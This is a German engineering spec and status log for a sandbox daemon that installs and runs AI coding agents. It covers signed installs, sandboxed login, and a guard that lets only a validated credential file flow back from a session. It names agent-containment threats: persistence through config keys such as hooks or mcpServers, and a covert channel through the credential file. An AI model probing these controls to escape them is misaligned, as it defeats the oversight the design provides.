### Stand nach der Umsetzung (2026-11-19, Kern)

Gebaut ist der Kern im Sandbox-Crate, noch ohne Sitzung, RPC und CLI:
`InstallRecipe` im Rezept (Skript, Hosts mit Beleg, Ort des Programms,
Plattformnamen, `SignedManifest`) mit belegten Werten für Claude Code;
`depot/maintenance.rs` bereitet einen Lauf vor (Sitzungsart
`DepotMaintenance { agent, task }`, Arbeitsordner als `HOME` neben den
Depots, Kommando `/bin/sh -c`, Variablen des Vertrags, `allow`-Regeln nur
für die Hosts des Rezepts mit `Expiry::Session`) und übernimmt das Ergebnis.
Der Lauf lädt nur herunter und meldet kein Urteil. `depot/adopt.rs` liest
das Ergebnis nur über geöffnete Ordner mit `O_NOFOLLOW`, prüft den Baum
(reguläre Dateien, Ordner, relative Links innerhalb mit `..` nur am Anfang
des Ziels, sodass auch Ketten von Links nicht hinausführen; keine Sockets,
FIFOs, Geräte, harten Links, Set-ID-Bits, Namen außer UTF-8; 2 GiB, 50 000
Einträge, Tiefe 64) und kopiert mit SHA-256 je Datei in einen eigenen
Zwischenordner neben den Depots. `depot/verify.rs`: Der Daemon prüft seine
eigene Kopie von Manifest, Signatur und Schlüssel selbst mit dem `gpg` des
Hosts (frisches `GNUPGHOME`, `--no-autostart`, `--disable-dirmngr`, Status
aus dem eigenen Kindprozess); der Import muss genau den festen Schlüssel
nennen, `VALIDSIG` den festen Fingerabdruck; danach SHA-256 des Programms
gegen das geprüfte Manifest. Die Version eines signierten Laufs kommt aus
dem geprüften Manifest (Claude Code: Feld `version`); nennt der Lauf eine
andere, wird abgelehnt, sodass keine ältere echte Fassung unter einer
neueren Nummer landet. Bei einem Rezept ohne Signatur bindet nichts die
Version: sie ist das Wort des Laufs, geprüft nur auf Form und gegen die
verlangte. Fehlt `gpg` auf dem Host, scheitert ein signiertes Rezept
geschlossen. Erst danach entstehen die Ordner des Depots
(eine abgelehnte Erstinstallation hinterlässt kein Depot), dann Journal
(`.committing`), `rename` nach `program/<version>/`, Umschalten von
`current`, Ende des Journals; synchronisiert werden die Ordner des
Zwischenbaums von den Blättern aufwärts, neu angelegte Ordner des Depots samt
Eltern und beide Ordner jedes `rename`. Ein Absturz dazwischen wird vor der
nächsten Übernahme oder Umschaltung zurückgenommen. Scheitert nach dem
`rename` von `current` das `fsync` oder das Ende des Journals, setzt die
Übernahme `current` zurück und entfernt die neue Version, aber nur unter der
exklusiven Sperre des Depots (eine Sitzung kann auf ihr gestartet sein; dann
bleibt sie für das spätere Aufräumen); misslingt auch das Zurücksetzen, sagt
der Befund, dass `current` die neue Version nennen kann. Das erste Anlegen von
`agents/` (auch über eine Sperrdatei) synchronisiert den Datenordner darüber.
Ein vorbereiteter Lauf hält die Wartungssperre des Agenten und eine
geteilte Reservierung des Depots (kein `remove` darunter); die Übernahme
prüft die Voraussetzung des Updates erneut. Das Umschalten zurück nimmt die
Wartungssperre; das Aufräumen alter Versionen entscheidet unter der
exklusiven Sperre mit `current`, wie es dann auf der Platte steht, und
behält die vorige Version. Version angeheftet: `install` auf ein
installiertes Depot und eine andere Version als verlangt ergeben `AGENT_011`
(Schritt `pin`), ein Update auf eine vorhandene Version schaltet ohne Lauf
um. Sperren des Depots werden achtmal im Abstand von 10 ms versucht (ein
gerade freigegebenes Schloss kann ein abgezweigter Kindprozess vor seinem
`exec` noch halten). `AGENT_011` registriert.

Abweichung: Das Rezept für Claude Code lädt Manifest, Signatur, Schlüssel und
Programm direkt von `downloads.claude.ai` (dorthin leitet
`claude.ai/install.sh` um) und führt `claude install` nicht aus. So läuft
während der Installation nichts Heruntergeladenes, und nur ein Host ist
nötig.

Offen, für ein Folge-Issue: die Sitzungsart im Daemon (`SandboxService`:
Start ohne `/work`, Arbeitsordner als `HOME` unter
`MAINTENANCE_HOME_DST`, Sitzungsregeln in den Regelspeicher, Briefing aus,
`commit` nach dem Ende), RPC `Agents` mit `install`/`update` samt Sitzung
(Protokoll-Minor), CLI `humanitl agents install|update [--version] [--yes]`
mit Anhängen an das Terminal, Parität, `docs/cli.md`, Ende-zu-Ende-Test im
bwrap mit Stellvertreter-Server hinter dem Proxy (gehaltener fremder Host,
Folgesitzung), Selbst-Update scheitert am nur lesbaren Ordner im Lauf,
`docs/SECURITY.md` und K-36 (en, de).

---

## HUM-520 · Agent-Depot: Anmeldung in der Sandbox und Wächter für das Zurückschreiben der Zugangsdatei

### Kontext
ADR-0023 Punkte 4, 5 und 7. Die Anmeldung soll einmal geschehen und für
jede Sitzung gelten. Weil Tokens ablaufen und manche Anbieter den
Refresh-Token bei jeder Nutzung tauschen, muss genau eine Datei aus der
Sitzung zurück ins Depot. Das ist die neue Angriffsfläche: Eine
kompromittierte Sitzung, die etwas ins Depot schreibt, wirkt in jeder
späteren. Der Wächter lässt nur die Zugangsdatei durch, und nur geprüft.

### Spezifikation
1. **Anmeldung** als Wartungslauf (HUM-519) mit `task = Login`: Anmeldehosts
   des Adapters als Sitzungsregeln, Kommando des Adapters (Claude Code:
   `claude` bzw. `claude auth login`; Codex: `codex login --device-auth`;
   `agy`: siehe HUM-517). App und CLI zeigen die Anmelde-URL aus der
   Ausgabe und öffnen sie auf dem Host nur auf Klick bzw. Bestätigung und
   nur für Hosts aus der Liste des Adapters; andere URLs werden gezeigt,
   nicht geöffnet.
2. **Wo der Callback die Sandbox nicht erreicht** (Codex,
   `localhost:1455`): zuerst der Geräte-Fluss; sonst fügt der Nutzer die
   URL aus der Adresszeile des Browsers in App bzw. CLI ein, der Daemon
   prüft, dass es genau `http://localhost:1455/auth/callback?…` ist, und
   stellt sie in der Sandbox an `127.0.0.1:1455` zu (ein Prozess im Lauf,
   kein Weg von außen hinein). Keine Weiterleitung eines Ports vom Host in
   die Sandbox. Das Zustellen gibt es nur auf Backends, deren Sandbox ein
   eigenes Loopback hat, auf dem der Agent binden darf (bwrap, Podman,
   `qemu`). Unter Seatbelt (macOS) erlaubt das Profil nur die zwei Ports
   der Sitzung und teilt das Loopback des Hosts
   (`daemon/crates/sandbox/src/seatbelt.rs`, `render_network`); dort ist der
   Geräte-Fluss der einzige unterstützte Weg, das Feld zum Einfügen
   erscheint nicht, und ist der Geräte-Fluss im ChatGPT-Konto aus, endet
   die Anmeldung mit `AGENT_014`, dessen `fix` die Einstellung nennt.
3. **Übernahme nach der Anmeldung: nur Anmeldedaten.** Übernommen wird die
   Zugangsdatei über den Wächter (Punkt 4), sonst nichts aus dem
   Anmeldelauf. Wo ein Agent Kontodaten in einer Datei hält, die auch
   Konfiguration trägt (Claude Code `.claude.json` mischt Kontozustand mit
   Befehlen in `mcpServers`), wird die Datei nie übernommen; der Adapter
   darf höchstens einzeln benannte Felder angeben (etwa
   `oauthAccount`, vor dem Bau messen), die der Daemon selbst ausliest,
   nach Typ und Form prüft und in die Kopie im Depot schreibt. Jede andere
   Änderung des Laufs wird verworfen; Konfiguration ändert sich nur über
   den bestätigten Konfigurationslauf (Punkt 5). Der Daemon merkt sich
   das Konto, wo das Format es nennt.
4. **Wächter** für jede Rückschrift, auch aus normalen Sitzungen:
   - nur die eine Datei, die der Adapter angibt, relativ zum Arbeitsordner
     mit `openat` und `O_NOFOLLOW`, reguläre Datei, höchstens 64 KiB;
   - Format des Adapters: nur bekannte Schlüssel, Werte mit erwartetem Typ
     und erwarteter Form. **Erste Anmeldung:** es gibt noch keine
     gespeicherte Datei; geprüft wird nur gegen das Schema des Adapters
     (Pflichtschlüssel vorhanden, Typen, Form der Werte, Obergrenze).
     **Jede spätere Rückschrift:** Schema und zusätzlich Vergleich mit der
     gespeicherten Datei (kein Schlüssel mehr oder weniger, gleiche Form je
     Wert);
   - nicht älter als die gespeicherte, wo das Format einen Ablauf trägt;
     dasselbe Konto wie bei der Anmeldung, wo das Format es nennt
     (`AGENT_016` sonst, die gespeicherte bleibt);
   - atomar geschrieben (`0600`, temporäre Datei, `rename`) unter einer
     Sperre je Agent; Audit-Eintrag mit Agent, Sitzung und SHA-256 alt und
     neu, nie dem Inhalt;
   - abgelehnt: gespeicherte Datei unverändert, Befund `AGENT_012` an der
     Sitzung, Audit-Eintrag.
   Der Daemon prüft die Datei bei Änderung (abgefragt, etwa alle 10 s) und
   am Ende der Sitzung. Mit `agents.<id>.credential_writeback = false`
   schreibt er nichts zurück.
   Die Schlüssel legt HUM-518 an, ohne Leser bis hier (Register in
   `daemon/crates/config/tests/config_readers.rs`):
   `agents.opencode.credential_writeback`, `agents.pi.credential_writeback`,
   `agents.claude.credential_writeback`, `agents.codex.credential_writeback`,
   `agents.agy.credential_writeback`.
5. **Konfiguration ändern** über einen Wartungslauf `task = Config`
   (`humanitl agents config <id>`): der Agent läuft mit dem Depot als
   schreibbarer Kopie ohne Projekt; danach zeigen App und CLI die geänderten
   Dateien, Schlüssel, die Befehle ausführen (Angabe des Adapters, für
   Claude Code `hooks`, `apiKeyHelper`, `statusLine`, `mcpServers`, `env`),
   hervorgehoben; übernommen wird erst nach Bestätigung. `agents config
   <id> --show` listet den Stand.
6. **RPC** für Anmeldung, Konfigurationslauf und deren Übernahme bzw.
   Verwerfen; **CLI** `humanitl agents login <id>` und `humanitl agents
   config <id> [--show]`.
7. **Befunde:** `AGENT_012` Rückschrift abgelehnt, `AGENT_014` Anmeldung
   gescheitert oder Callback nicht zustellbar, `AGENT_016` anderes Konto
   oder älteres Token.

### Tests
- Stellvertreter-Adapter mit einer JSON-Zugangsdatei: gültige Erneuerung
  wird übernommen; nach dem Ende der Sitzung steht sie im Depot, `0600`.
- Erste Anmeldung ohne gespeicherte Datei: schemagerechte Datei wird
  übernommen; fehlender Pflichtschlüssel, falscher Typ, zusätzlicher
  Schlüssel oder Übergröße abgelehnt, Depot bleibt ohne Zugangsdatei.
- Spätere Rückschrift: Datei, die gegenüber der gespeicherten einen im
  Schema erlaubten optionalen Schlüssel ergänzt oder weglässt, abgelehnt.
  Mutationsbeweis: Vergleich mit der gespeicherten Datei entfernt färbt
  diesen Test rot; Pflichtschlüsselprüfung der ersten Anmeldung entfernt
  färbt den Test davor rot.
- Abgelehnt werden: unbekannter Schlüssel (`"hooks"`), falscher Typ,
  65 KiB, Symlink auf eine Datei des Hosts, FIFO, ein älteres Token, ein
  anderes Konto.
- Eine Sitzung schreibt `settings.json`, eine zweite Datei neben die
  Zugangsdatei und eine Datei in den Programmordner: nichts davon steht
  danach im Depot.
- Zwei Sitzungen erneuern nacheinander: die neuere gewinnt, die ältere
  überschreibt sie nicht.
- `credential_writeback = false`: nichts zurück.
- Callback-Einfügen: genau die erwartete URL wird zugestellt; eine URL mit
  anderem Host, Port oder Pfad wird abgelehnt.
- Seatbelt-Plan (macOS-Test): kein Zustellen, kein Einfügefeld im Status;
  Geräte-Fluss aus ergibt `AGENT_014` mit `fix`.
- Anmeldelauf, in dem der Stellvertreter-Agent neben der Zugangsdatei eine
  `.claude.json` mit `mcpServers` und `oauthAccount`, eine `settings.json`
  mit `hooks` und eine Datei in `config/` schreibt: im Depot steht danach
  nur die Zugangsdatei und, falls benannt, das Feld `oauthAccount` in der
  Kopie des Daemons; kein `mcpServers`, kein `hooks`. Mutationsbeweis:
  ganze `.claude.json` übernommen färbt den Test rot.
- Konfigurationslauf: ohne Bestätigung keine Änderung; ein neuer `hooks`
  Eintrag ist in der Liste hervorgehoben.
- **Mutationsbeweise** für den Wächter, jeder färbt mindestens einen Test
  rot: Formatprüfung durch `Ok(())` ersetzt; ganzen Arbeitsordner statt
  der einen Datei übernommen; `O_NOFOLLOW` entfernt; Altersvergleich
  entfernt; `rename` durch direktes Schreiben ersetzt (Test mit Abbruch
  mitten im Schreiben).

### Fallstricke
- Rotierende Refresh-Tokens (Codex): zwei gleichzeitige Sitzungen können
  einander das Token ungültig machen; dann ist eine neue Anmeldung nötig.
  Der Status sagt, welche Sitzung zuletzt schrieb; nie ein älteres über
  ein neueres schreiben.
- Ein Format mit Ablaufzeit kann sie in Sekunden oder Millisekunden
  führen; je Adapter am Beispiel belegen.
- `claude` schreibt Kontozustand nach `.claude.json`, dieselbe Datei
  trägt `mcpServers`; welche Felder nötig sind, damit eine Sitzung ohne
  erneute Einrichtung startet, vor dem Bau messen, nicht raten. Fehlt ein
  Feld, startet die Sitzung mit einer Rückfrage des Agenten, nicht mit
  übernommener Datei.
- Den D-Bus-Session-Bus des Hosts nie einbinden, auch nicht für `agy`.
- Nie die eigenen Anmeldedateien des Entwicklers (`~/.claude`,
  `~/.codex`, Schlüsselbund) für Tests lesen; nur Stellvertreter.

### Akzeptanzkriterien
1. Einmal anmelden, danach startet jede Sitzung mit `depot` angemeldet,
   auch eine Wegwerf-Sitzung, ohne erneute Anmeldung.
2. Keine Sitzung kann etwas anderes als die geprüfte Zugangsdatei ins Depot
   schreiben; die Mutationsbeweise belegen es.
3. Konfiguration ändert sich nur über einen bestätigten Konfigurationslauf.
4. `docs/SECURITY.md` (neuer Abschnitt in 5, Seitenkanal „Zugangsdatei des
   Depots"), `docs/THREAT-MODEL.md` (K-36 vollständig: Persistenz,
   Kontotausch, verdeckter Kanal über die Zugangsdatei, parallele
   Sitzungen) und die Tabelle der Seitenkanäle in `README.md` (en und de)
   im selben Commit.

### Stand nach der Umsetzung (2026-11-20)

Gebaut: der Wächter der Rückschrift (`sandbox/src/agent/depot/credential.rs`).
Er liest genau die eine Zugangsdatei des Adapters mit `openat`, `O_NOFOLLOW`
und `O_NONBLOCK` aus der Kopie der Sitzung, nur eine reguläre Datei bis
64 KiB, prüft sie gegen das Format des Adapters (`CredentialFormat`: Felder
als JSON-Zeiger mit Form `Object`, `Token`, `Text`, `Count`, `Flag`,
`TextList` und Pflicht, dazu Ablauf mit Einheit und Kontofeld), bei jeder
späteren Rückschrift auch gegen die gespeicherte Datei (gleiche Schlüssel,
gleiche Form, nicht älter, dasselbe Konto; ohne Ablauf im Format nur aus einer
Sitzung, die auf der gespeicherten Datei begann; bei gleichem Ablauf ebenso),
lehnt einen Ablauf mehr als 400 Tage voraus ab und schreibt die eigene
Serialisierung des geprüften Werts unter einer Sperre je Agent über eine
temporäre Datei `0600` und `rename`. `depot/writeback.rs` beobachtet die Datei
einer laufenden Sitzung alle 10 s und einmal am Ende vor dem Löschen der Kopie
(neuer Haken `SandboxHandle::before_cleanup`); `credential_writeback = false`
schaltet ihn ab, der Schlüssel ist damit wirksam. Jedes Ergebnis geht als
`SandboxNotice::CredentialWriteback` ins Audit-Log (`agent.credential_writeback`,
nur SHA-256 alt und neu), eine Ablehnung bis zur nächsten Übernahme in den
Status; `writeback.json` im Depot nennt die Sitzung, die zuletzt schrieb.
Anmeldung und Konfigurationslauf als Wartungsläufe (`MaintenanceTask::Login`,
`Config`, `depot/account.rs`): Programm des Depots nur lesbar, Kopie der
Konfiguration schreibbar, eigener `HOME`, kein Projekt; der Wächter der
Pläne lässt eine Einhängung des Depots im Wartungslauf nur für den
gekennzeichneten Agenten und genau sein Programm zu
(`DepotSession::maintenance_program`). Nach der Anmeldung nur die
Zugangsdatei über den Wächter und benannte Felder einer anderen Datei
(`NamedFields`, vom Daemon gelesen, geprüft, in die Kopie im Depot
geschrieben, nie die Datei). Der Konfigurationslauf legt die Änderung unter
`agents/.maintenance/<id>.config-pending/` ab, listet Dateien und Schlüssel,
hebt Schlüssel mit Befehlen hervor (`command_keys`, für Claude Code `hooks`,
`apiKeyHelper`, `statusLine`, `mcpServers`, `env`) und ersetzt `config/` erst
nach `config_accept`. URLs einer Anmeldung liest ein Leser zwischen Lauf und
Terminal (`depot/login_url.rs`); `openable` nur für die Anmeldehosts des
Adapters. Callback: genau `http://localhost:<port><pfad>?<query>`, zugestellt
mit `curl` als weitere Shell im Lauf (`open_shell`), nur bei eigenem Loopback
(`Backend::own_loopback`, unter Seatbelt nie, `callback_paste = false`). RPC
`Agents` mit `login`, `config`, `config_accept`, `config_discard`,
`config_show`, `deliver_callback` (Protokoll 1.53); CLI `humanitl agents login
<id> [--open]`, `agents callback <id> <url>`, `agents config <id> [--show |
--accept | --discard] [--yes]`. Befunde `AGENT_012`, `AGENT_014`, `AGENT_016`
und neu `AGENT_019` (Konfigurationslauf nicht übernommen; keiner der drei
vorgesehenen Codes passte), mit ARB und `diagnostic_l10n.dart`. Docs:
SECURITY Abschnitt 5.7 und Tabelle, K-36 dritter Teil, README-Tabelle (en, de),
`docs/cli.md` (en, de), `PROTOCOL.md`, CONVENTIONS 4.17.

Tests: Stellvertreter-Format in `credential/tests.rs` (Erneuerung `0600`,
erste Anmeldung, Pflichtschlüssel, Typ, Zusatzschlüssel, Übergröße, optionaler
Schlüssel später, `"hooks"`, 65 KiB, Symlink auf eine gültige Datei des Hosts,
FIFO, älteres Token, anderes Konto, zwei Sitzungen, ohne Ablauf, Abbruch beim
Schreiben, `.claude.json` mit `mcpServers` und `oauthAccount`), `writeback.rs`
(nach dem Ende im Depot, `credential_writeback = false`), `account/tests.rs`
(Anmeldelauf, Seatbelt-Fall mit Einstellung im `why`, Konfigurationslauf nur
nach Bestätigung, `hooks` hervorgehoben), `login_url.rs` (URL-Erkennung,
Callback mit anderem Host, Port, Pfad abgelehnt), Wächter der Pläne, und Ende
zu Ende im bwrap (`ipc/tests/depot_maintenance.rs`,
`a_login_in_the_sandbox_takes_back_only_the_credential_file`: Anmeldung mit
Stellvertreter-Programm, danach eine Sitzung, die angemeldet startet und
erneuert). Mutationsbeweise, jeder rot: Formatprüfung `Ok(())`, ganzer
Arbeitsordner übernommen, `O_NOFOLLOW` entfernt, Altersvergleich entfernt,
`rename` durch direktes Schreiben ersetzt, Vergleich mit der gespeicherten
Datei entfernt, Pflichtschlüsselprüfung entfernt, ganze `.claude.json`
übernommen.

Abweichung von Punkt 4 („Erste Anmeldung"): Die erste Zugangsdatei speichert
nur ein Anmeldelauf (`Origin::Login`), nie eine gewöhnliche Sitzung
(`AGENT_012`), damit keine Sitzung das Konto wählt (Review). Eine Anmeldung
prüft Zugangsdatei und benannte Felder vollständig, bevor sie eines davon
schreibt, und hält dabei eine Sperre; scheitert das Schreiben der Felder,
kommt die frühere Zugangsdatei (oder keine) zurück, beides im Audit-Log.
Benannte Felder dürfen zusammen 64 KiB groß sein, die Datei, aus der sie
kommen, und die zusammengeführte Datei im Depot 4 MiB. Die Suche nach
Schlüsseln mit Befehlen geht auch in Objekte, die einen Skalar ersetzen, und
in Arrays. Die Liste eines Konfigurationslaufs nennt Schlüssel mit
Befehlen immer und zuerst, ungekürzt; gekürzt werden nur die übrigen (50,
dazu `keys_omitted`).

Abweichungen und offen:
- **Formate der echten Agenten nicht erklärt.** Sie gehören in die Issues der
  Adapter (HUM-514 nennt `.credentials.json` mit Format und Anmeldehosts,
  HUM-515, HUM-517); HUM-520 baut den Mechanismus. Die Schlüssel von Claude Codes
  `.credentials.json` und die Felder von `.claude.json`, die eine Sitzung
  ohne erneute Einrichtung braucht (etwa `oauthAccount`), sind nicht
  veröffentlicht und hier nicht gemessen; im Rezept stehen
  `credential_format: None` und `login_run: None` (auch Anmeldekommando und
  Anmeldehosts unbelegt). Bis zur Messung im gemeinsamen Probedurchgang
  (HUM-553) nimmt der Wächter für Claude Code nichts zurück, und
  `agents login claude` antwortet `AGENT_014`. Akzeptanzkriterium 1 ist damit
  nur mit dem Stellvertreter belegt. Codex und `agy` haben noch kein Rezept
  (HUM-515, HUM-517).
- Der `fix` von `AGENT_014` unter Seatbelt nennt die Einstellung des
  Anbieters im `why`, nicht als `FixAction`: Es gibt keine Art für eine
  Einstellung beim Anbieter. Seatbelt lehnt Wartungsläufe ohnehin noch ab
  (`AGENT_015`, HUM-563); belegt ist das Verhalten als Unit-Test, nicht im
  CI-Job `macos`.
- Das Zustellen des Callbacks braucht `curl` im `/usr` des Hosts; ohne
  `curl` endet es mit `AGENT_014`. Ende zu Ende nicht getestet (kein Adapter
  mit Callback).
- Eine Sitzung, die die CLI ohne Daemon startet (`humanitl sandbox run`),
  schreibt nichts zurück.
- Öffnen der URL in der CLI nur mit `--open` (die Bestätigung vorab), weil das
  Terminal während des Anhängens im Rohmodus ist; die App (HUM-521) zeigt die
  URLs aus `AgentMaintenance.login_urls`.
- Ein wartender Konfigurationslauf steht nach einem Neustart des Daemons nur
  noch auf der Platte; `agents config <id> --accept` übernimmt ihn trotzdem.

---

## HUM-521 · App: Abschnitt „Agenten" für Quelle und Depot

### Kontext
ADR-0023 Punkt 8, ADR-018: Alles aus HUM-518 bis HUM-520 soll auch in der
Oberfläche gehen. Die App ist ein dünner Client der RPCs.

### Spezifikation
1. Einstellungen, eigener Abschnitt „Agenten", eine Karte je Agent: Quelle
   Host/Depot (Umschalter), installierte Version und Signatur, angemeldet
   ja/nein mit letzter Rückschrift, Größe; Knöpfe Installieren, Anmelden,
   Aktualisieren, Konfigurieren, Entfernen (mit Bestätigung), je nach
   Zustand aktiv.
2. Gleichstand mit der CLI aus HUM-518 bis HUM-520, jeweils über RPC:
   - Schalter „Zugangsdaten zurückschreiben" je Agent
     (`agents.<id>.credential_writeback`);
   - Versionswahl bei Installieren und Aktualisieren (aktuelle oder
     eingegebene Version, Liste der im Depot vorhandenen für ein Zurück),
     wie `--version`;
   - Ansicht der Konfiguration im Depot (wie `agents config <id> --show`),
     nur lesend.
   Der Schalter für `agents.encrypt_credentials` kommt mit HUM-523.
3. Gesperrte Quelle: Umschalter ausgegraut, Text „Von deiner Firma
   festgelegt" mit Quelle der Vorgabe; Host-Knöpfe aus.
4. Wartungsläufe öffnen das Terminal der Sitzung wie jede Sitzung; die
   Anmelde-URL als Knopf „Im Browser öffnen" nur für die Hosts des
   Adapters; Feld zum Einfügen der Callback-URL, wo der Adapter es braucht.
5. Nach einem Konfigurationslauf die Liste der geänderten Dateien mit
   hervorgehobenen Befehls-Schlüsseln, Knöpfe Übernehmen und Verwerfen.
6. Texte über ARB (en Quelle, de Übersetzung); Befunde aus HUM-518 bis
   HUM-520 mit `why` und `fix` an der Karte.
7. Fake-Daemon für Widget-Tests ergänzen (gemeinsam genutzte Datei).

### Tests
- Widget-Tests je Zustand (nicht installiert, installiert, angemeldet,
  gesperrt, Fehler) mit `TargetPlatformVariant` für Linux und macOS;
  Golden der Karte hell und dunkel.
- Klick auf eine URL eines fremden Hosts öffnet nichts.
- Schalter „Zugangsdaten zurückschreiben" ruft den RPC und zeigt den neuen
  Stand; Versionswahl schickt die gewählte Version; Zurück auf eine ältere
  Version aus der Liste; Konfigurationsansicht zeigt die Dateien.
- Gesperrt: Umschalter ohne Wirkung, Text sichtbar.
- Mutationsbeweis: Sperre in der Karte ignoriert färbt den Test rot.

### Fallstricke
- Screenshot und Design-Prüfung vor dem Landen (Owner-Beschwerde vom
  2026-11-01 über UI-Knöpfe).
- Die App entscheidet nichts selbst: ob ein Knopf aktiv ist, kommt aus dem
  Status des RPC.

### Akzeptanzkriterien
1. Jede Fähigkeit von `humanitl agents` aus HUM-518 bis HUM-520
   (`status`, `source`, `install`/`update` mit `--version` samt Zurück,
   `login`, `config` samt `--show`, `remove`) und der Schlüssel
   `agents.<id>.credential_writeback` sind in der App erreichbar.
2. Eine gesperrte Quelle ist sichtbar und in der App nicht änderbar.

### Stand nach der Umsetzung (2026-11-20)

Gebaut: die Kategorie „Agenten" der Einstellungen (Katalog-Eintrag
`agents.depot`, `Control::Special`) mit einer Karte je bekanntem Agenten:
Umschalter Host/Depot über `Agents.set_source`, Version mit Signatur,
Anmeldung mit letzter Rückschrift, Größe, Schalter
`agents.<id>.credential_writeback` über `SetConfig`, die Befunde des Depots
als Karte mit `why` und `fix`, der letzte Wartungslauf (läuft, Anmelde-URLs
mit „Im Browser öffnen" nur bei `openable`, Callback-Feld nur bei
`callback_paste`, geänderte Dateien mit hervorgehobenen `command_keys` und
Übernehmen/Verwerfen, Ergebnis oder Befunde), die nur lesende Ansicht von
`config/` und die Knöpfe Installieren, Aktualisieren, Anmelden,
Konfigurieren, Konfiguration zeigen und Entfernen (mit Rückfrage).
Versionswahl: „Aktuelle", eine eingegebene Version oder eine der Versionen
im Depot für ein Zurück (umschalten ohne Lauf). Installieren, Aktualisieren
und Konfigurieren schließen die Einstellungen und zeigen das Terminal der
Sitzung auf der Sandbox-Seite; eine Anmeldung bleibt an der Karte, weil URL
und Callback-Feld dort stehen, mit „Terminal öffnen" daneben. Während eines
Laufs liest die Karte den Stand alle 1,5 s neu.

Abweichung, im Daemon nachgezogen: Der Status nannte weder die Versionen im
Depot noch, welche Operation offen ist; die App hätte beides selbst
ableiten müssen (und ob ein Adapter eine Anmeldung kann, weiß nur das
Rezept). Neu `AgentDepot.versions` (neueste zuerst, nur Ordner mit gültigem
Namen und passendem Manifest, `Depot::versions`) und `AgentDepot.actions`
(`AgentActions`: `install`, `update`, `login`, `config`, `config_show`,
`remove`, `source_host`, `source_depot`, aus Rezept, Depot, Sperre und
laufendem Lauf, dazu ob jetzt eine Sitzung starten könnte und ob das Depot
seine Prüfung besteht), `AgentDepot.credential_writeback` (wirksamer Wert),
Zustand `discarded` nach Verwerfen, und eine Konfiguration, die nach einem
Neustart des Daemons noch auf der Platte wartet, steht als `confirm` im
Status. Protokoll 1.54. Ein Daemon davor schickt keine `actions`; die App
bietet dann nichts an. Agenten ohne Rezept zeigen, was der Daemon annimmt:
Quelle Depot (mit `AGENT_015`), Schalter der Rückschrift, Entfernen eines
vorhandenen Depots. Der Konfigurationslauf kopiert in
`<id>.config-staging/` und macht daraus erst nach vollständiger Kopie mit
einem `rename` den wartenden Vorschlag; ein Abbruch dazwischen hinterlässt
keinen halben Vorschlag, der Rest geht beim nächsten Lauf unter der
Wartungssperre weg (Mutationsbeweis: Kopie direkt in den Vorschlag färbt
`an_interrupted_copy_leaves_no_pending_proposal` rot). Eine Entscheidung
über einen Vorschlag, der nur auf der Platte lag, ersetzt einen beendeten
Lauf im Speicher.

Tests: `app/test/features/settings/agents_settings_test.dart` (je Zustand
nicht installiert, installiert, angemeldet, gesperrt, Fehler, dazu
Quelle, Rückschrift, Versionswahl, Zurück, Konfigurationsansicht,
Konfigurationslauf mit Übernehmen und Verwerfen, URL eines fremden Hosts,
Callback, Entfernen, Absage des Daemons; alle unter
`TargetPlatformVariant` Linux und macOS), Goldens
`settings_agents_cards` und `settings_agents_runs` (hell und dunkel, en und
de), im Daemon `agents/tests.rs` (Aktionen aus Rezept, Depot und Sperre;
laufender Lauf nimmt sie zurück) und `store.rs` (Versionen, Reihenfolge).
Mutationsbeweise, jeder rot: Sperre in der Karte ignoriert (`locked =
false`), Knopf „Im Browser öffnen" auch für eine URL, die sich nicht öffnen lassen soll.

Die neue Kategorie verschiebt die linke Spalte; die Goldens der
Einstellungen und der Shell mit offener Einstellung sind deshalb erneuert.

---

## HUM-522 · Agent-Depot: Ende-zu-Ende-Lauf mit Claude Code und Anleitung

### Kontext
Abschluss von ADR-0023: Ein echter Agent durch die ganze Kette, und eine
Anleitung für Nutzer.

### Spezifikation
1. Ende-zu-Ende-Test in der CI: `agents source claude depot`, `agents
   install claude --version <fest>` gegen einen Stellvertreter-Server, der
   eine echte Version und ihr signiertes Manifest aus einem Cache liefert
   (oder, wo das nicht geht, ein Stellvertreter-Programm), Anmeldung mit
   einem Stellvertreter-Endpunkt über `ANTHROPIC_BASE_URL` statt echter
   Anmeldung, zwei Wegwerf-Sitzungen nacheinander ohne erneute Anmeldung,
   `agents remove claude`.
2. Anleitung `docs/guides/agent-depot.md` (en, de unter
   `docs/translations/`): wann das Depot, wie wechseln, was es schützt und
   was nicht (gleicher Nutzer auf dem Host, Kontotausch, Seitenkanal),
   Firmen-Vorgabe.
3. `docs/cli.md` mit `humanitl agents`.

### Tests
- Der Ende-zu-Ende-Lauf selbst; auf dem Host liegt danach kein `claude`
  außerhalb des Depots (Prüfung von `PATH` und `~/.local`).

### Akzeptanzkriterien
1. Ein Nutzer ohne Agent auf dem Host kommt mit der Anleitung bis zum
   Prompt von Claude Code in einer Wegwerf-Sitzung, und die zweite Sitzung
   fragt nicht erneut nach der Anmeldung.

---

## HUM-523 · Agent-Depot: Zugangsdateien verschlüsselt mit Schlüssel aus dem Schlüsselbund

### Kontext
ADR-0023 Punkt 6. Wahlweise sollen die Zugangsdateien im Depot nicht im
Klartext liegen.

### Spezifikation
1. Schlüssel `agents.encrypt_credentials` (Vorgabe `false`,
   `x-project-scope = denied`). Mit `true`: AEAD aus einer etablierten
   Crate (Vorschlag `chacha20poly1305` aus RustCrypto; Aufnahme in
   `daemon/Cargo.toml` zentral, nicht durch den Agenten), Schlüssel im
   Schlüsselbund wie `llm.api_key_ref` (`config/src/secret.rs`).
2. Ohne erreichbaren Schlüsselbund wird die Einstellung abgelehnt; kein
   Rückfall auf eine Schlüsseldatei neben den Daten.
3. Entschlüsselt wird nur in den Arbeitsordner der Sitzung; der Wächter
   (HUM-520) verschlüsselt beim Zurückschreiben.
4. Umschalten verschlüsselt bzw. entschlüsselt die vorhandenen Dateien
   atomar; Status, App und CLI zeigen „verschlüsselt".
5. Umschalten über RPC, in der CLI über `humanitl config set
   agents.encrypt_credentials`, in der App als Schalter im Abschnitt
   „Agenten" (HUM-521), mit dem Befund bei fehlendem Schlüsselbund an der
   Karte.

### Tests
- Datei im Depot ist nicht Klartext; Sitzung bekommt Klartext; Rückschrift
  wieder verschlüsselt.
- Falscher Schlüssel: Befund, Datei unverändert.
- Ohne Schlüsselbund: Einstellung abgelehnt.
- Widget-Test: Schalter einschalten und ausschalten ruft jeweils den RPC,
  der Stand „verschlüsselt" folgt; ohne Schlüsselbund bleibt er aus und
  der Befund steht an der Karte.
- Mutationsbeweis: Rückschrift im Klartext färbt den Test rot.

### Akzeptanzkriterien
1. Mit `true` liegt keine Zugangsdatei im Klartext im Depot.
2. Die Verschlüsselung lässt sich in App und CLI ein- und ausschalten.
